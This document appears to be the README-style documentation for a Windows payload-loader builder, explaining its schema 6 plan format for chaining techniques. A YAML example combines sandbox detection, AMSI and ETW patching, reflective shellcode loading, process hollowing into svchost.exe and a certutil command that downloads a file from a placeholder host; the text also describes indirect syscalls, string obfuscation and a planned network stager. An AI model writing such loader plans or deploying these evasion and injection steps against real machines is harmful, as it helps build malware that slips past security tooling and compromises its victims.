# Runtime steps (schema 6)

Schema 6 keeps the whole build under `build:` (`crypto`, `payloads`, `stub`,
`output`) and expresses the loader as an ordered **`runtime:`** list of
technique steps. There is no other shape: no `stages:`, no nested pipelines, no
single `build.payload`. A step is the lego — a technique call plus how the loader
reacts to its result — and one artifact can deliver several payloads (two
shellcodes, two EXEs, or a mix) plus living-off-the-land commands.

```yaml
schema: 6
name: advanced

build:
  crypto: { algo: xchacha20poly1305, key: random }   # default, inherited by every payload
  payloads:
    dropper:
      source: ./examples/payloads/demo_shellcode.bin
      format: shellcode
      args: ["--phase=recon"]
    implant:
      source: ./examples/payloads/test_payload.exe
      format: pe
      args: ["--phase=implant"]
  stub: { path: null, debug: false, strings: { strategy: xor }, syscalls: { mode: indirect } }
  output:
    path: ./dist/advanced.exe
    arch: x64
    strip: true
    trim_paths: all
    subsystem: console
    manifest: true

runtime:
  - technique: bouncer
    params: { mode: all, on_fail: silent, min_ram_mb: 512, not_in_sandbox: true }
    on_fail: stop
  - technique: patch_amsi
  - technique: patch_etw
  - technique: reflective_loading
    params: { payload: dropper }
  - technique: sleep
    params: { ms: 250 }
  - technique: living_off_the_land
    params:
      binary: certutil.exe
      args: ["-urlcache", "-f", "https://example.invalid/next.bin", "C:\\Users\\Public\\next.bin"]
      window: hidden
      wait: true
      timeout_s: 30
    on_fail: continue
  - technique: process_hollowing
    params: { payload: implant, target: "C:\\Windows\\System32\\svchost.exe" }
    on_fail: stop
  - technique: sleep
    params: { ms: 1500 }
  - technique: reflective_loading
    params: { payload: final }
    on_success: continue
```

Two runnable examples: [`examples/plans/multistage.yaml`](https://github.com/M3str3/Picaro/blob/main/examples/plans/multistage.yaml)
(two shellcodes + a living-off-the-land command) and the richer
[`examples/plans/multistage-advanced.yaml`](https://github.com/M3str3/Picaro/blob/main/examples/plans/multistage-advanced.yaml)
(a `bouncer` gate with indirect syscalls, a `certutil` download step, a hollowed
EXE, a sleep, a detached `rundll32` proxy and a terminal reflective step).

## Payloads

`build.payloads` is a **named map**. An Execution step loads one by name through
`params.payload`:

- **one payload** declared ⇒ `params.payload` may be omitted (it is the only
  choice);
- **two or more** ⇒ `params.payload` is required; a missing or unknown name is a
  clear error (`plan::steps::resolve`).

Only the Execution techniques (`reflective_loading`, `process_hollowing`,
`dotnet_hosting`, `execution_callbacks`, `module_stomping`, `fibers`) take a
payload; Preparation and Control steps never do. The
crypto comes from the payload's own `crypto` block, falling back to
`build.crypto`; with neither it defaults to `xchacha20poly1305` with a random
key. `build.output.arch` (`x64`), `strip` (`true`) and `trim_paths` (`all`) also
default, so a minimal plan only needs `output.path`.

`build.output.kind` (`exe`) turns the artifact into a DLL a host process loads
(`dll`), and `build.output.entry` (`auto`) picks which exports start the chain
(`jni_on_load`, `export:<name>`). A DLL build rejects what only an executable
can do — `subsystem`, `resources.manifest`, `self_deletion`, `bouncer` with
`on_fail: exit`, a custom stub — because the host owns the process. See
[DLL output design](design/dll-output.md).

## Step fields

Each step is `technique:` + optional `params:` + the orchestration fields:

| Field | Default | Meaning |
| --- | --- | --- |
| `technique` | — | The technique to run (the same keys as the registry). |
| `params` | technique defaults | The technique's own parameters; omitted when it has none. |
| `on_success` | `continue` | `continue` \| `stop` (stop with this step's code) \| `exit` (stop, exit 0). |
| `on_fail` | `stop` | `stop` (report and exit 1) \| `continue` (log and go on) \| `exit` (report, exit 0). |
| `delay_ms` | `0` | Wait before starting the step. |

Techniques fall into three categories:

- **Preparation** (`bouncer`, `anti_debug`, `patch_amsi`, `patch_etw`,
  `sleep_obfuscation`): modify the process state. A preparation returns
  `Result<bool, _>`; `Ok(false)` aborts the chain before the payload runs (the
  `bouncer` gate does this).
- **Execution** (`reflective_loading`, `process_hollowing`, `dotnet_hosting`,
  `execution_callbacks`, `module_stomping`, `fibers`): run an embedded payload.
- **Control** (`living_off_the_land`, `sleep`): orchestrate the chain — launch a
  process and capture its exit code, or wait.

`living_off_the_land` launches a process: `binary` (a bare name is resolved
against `System32` at run time), `args`, `window` (`hidden`/`normal`), `wait`
(capture the exit code) and `timeout_s`. A `binary` outside a curated
living-off-the-land catalogue (`certutil`, `bitsadmin`, `rundll32`, `regsvr32`,
`mshta`, `wmic`, `msbuild`, `curl`, `cmd`, `powershell`, ...) draws a **build
warning**; it is advisory only.

`sleep` takes `ms`. `params` is optional for a technique whose parameters all
have defaults (`patch_amsi`).

Each Execution step's payload args are applied to that step only: the generated
runner sets a thread-local context before each Execution step, so two steps can
pass different arguments to their payloads.

## The rule that shapes everything: which steps return control

A chain only continues if the loader gets control back after a step. That is a
property of the technique and the payload, not a flag:

| Step | Returns control? | Why |
| --- | --- | --- |
| `living_off_the_land` | **Always** | The loader spawns a child and keeps running. |
| `process_hollowing` | **Always** | A separate process; the loader waits and reads its exit status. |
| `reflective_loading` + `dll` | **Always** | A mapped DLL's entry point is `DllMain`, which returns. |
| `reflective_loading` + `shellcode` | **If the shellcode returns** | It runs on its own thread; a beacon that never returns blocks the chain. |
| `reflective_loading` + `pe` (an EXE) | **No** | The entry point runs on the stub's thread and a normal `mainCRTStartup` calls `ExitProcess`, killing the whole process. |
| `dotnet_hosting` | **No** | The CLR is hosted in the stub's process; a managed `Main` that exits ends it. |
| `execution_callbacks` | **If the shellcode returns** | The payload runs as the callback of an enumeration API on the loader's thread; the fragment stops the enumeration and returns once it finishes. |
| `module_stomping` | **If the shellcode returns** | The payload is called from the loader's thread after its code section is overwritten. |
| `fibers` | **If the shellcode returns** | The payload runs on a fiber; control comes back to the loader's fiber when it returns. |

So a **terminal** step (`reflective_loading` of a PE executable, or
`dotnet_hosting`) can only be the **last** one; `plan::validate` rejects it
otherwise. Everything else chains. Two Execution techniques can coexist as
separate steps (each with its own payload); the registry's `conflicts` metadata
is no longer enforced against them.

## How it is built

The build renders a single template (`src/engine/templates/main.rs.tpl`):

- every Execution step's payload is encrypted with its own key/nonce and
  embedded with `include_bytes!`;
- each step is wrapped in its own `mod step_<index>` (so two steps can use the
  same technique without colliding on top-level names); an Execution step
  exposes `payload(image)`, a Preparation a `run() -> Result<bool, _>` and
  `living_off_the_land` a `run() -> Result<i32, _>`;
- `sleep` renders as one inline `std::thread::sleep(...)`;
- a generated runner walks the steps in order, decrypting each payload, printing
  its per-step marker, and applying the declared gating.

A custom stub (`build.stub.path`) is rendered through the same engine and may
reference the same blocks; see [Custom stubs](custom-stubs.md).

## Validation

- `runtime` must declare at least one step;
- an Execution step must resolve to a declared payload (implicit only when there
  is exactly one);
- the **terminal-step** rule above;
- per-step format/technique and architecture rules, against the shared
  `build.output.arch`;
- `build.stub.api_resolution.mode: proxy` is loader-wide, so it is rejected
  unless the runtime declares exactly one Execution step (and never with
  `process_hollowing`).

## Limitations

- **A terminal step must be last.** `reflective_loading` of a PE executable and
  `dotnet_hosting` hand the process over.
- **In-process chaining leaves the process dirty** (an unfreed mapped image, a
  leaked `TlsAlloc` index, a repatched PEB command line). Prefer process-based
  steps (`living_off_the_land`, `process_hollowing`) when chaining more than one
  in-process step.
- **A shellcode step only chains if the shellcode returns.** Running two
  non-returning shellcodes needs a process-per-step injection technique (not
  implemented yet).
- **Two reflectively loaded EXEs cannot be chained** without intercepting
  `ExitProcess`/`TerminateProcess` (future work).
- **`living_off_the_land` spawns a visible child** (PPID = the stub, command line
  observable); `window: hidden` hides the window only.
- **Per-step payload args and a steps-aware manifest** are recorded per step, but
  the interactive wizard still writes a single-payload plan.

## Roadmap

- Returning techniques (cooperative payloads, an `ExitProcess` interceptor) so
  more steps can chain in-process.
- A run-time network stager (`payload.source: http(s)://` resolved in the stub).
- A wizard flow for building multi-step runtimes interactively.
